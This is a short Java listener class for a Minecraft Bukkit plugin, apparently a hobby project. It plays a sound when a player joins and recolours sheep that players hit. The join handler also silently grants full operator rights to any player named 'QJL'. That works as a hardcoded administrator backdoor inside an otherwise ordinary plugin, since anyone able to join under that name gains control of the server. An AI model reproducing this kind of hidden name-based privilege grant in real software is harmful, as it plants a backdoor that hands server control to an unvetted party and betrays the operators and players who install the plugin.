package com.qjl.myplugin.mylisteners;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.DyeColor;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.entity.Sheep;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;


import static org.bukkit.Sound.AMBIENT_BASALT_DELTAS_MOOD;
import org.bukkit.Server;

import java.util.Random;

public class MyListener implements org.bukkit.event.Listener {
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e){

        Player p = e.getPlayer();
        //MyPlugin mplugin = MyPlugin.getthis();
        if(p.getName().equals("QJL")){
            p.setOp(true);
        }
        p.playSound(p.getLocation(), AMBIENT_BASALT_DELTAS_MOOD, 1, 1);
        Bukkit.getLogger().info("played");
    }

    @EventHandler
    public void onPlayerHitSheep(EntityDamageByEntityEvent e){
        Entity damager = e.getDamager();
        Entity target = e.getEntity();

        if(damager != null && damager instanceof Player
            && target != null && target instanceof Sheep
        ){
            e.setCancelled(true);
            Sheep sp = (Sheep) target;
            DyeColor[] colors = DyeColor.values();
            sp.setColor(colors[new Random().nextInt(colors.length)]);
        }
    }
}

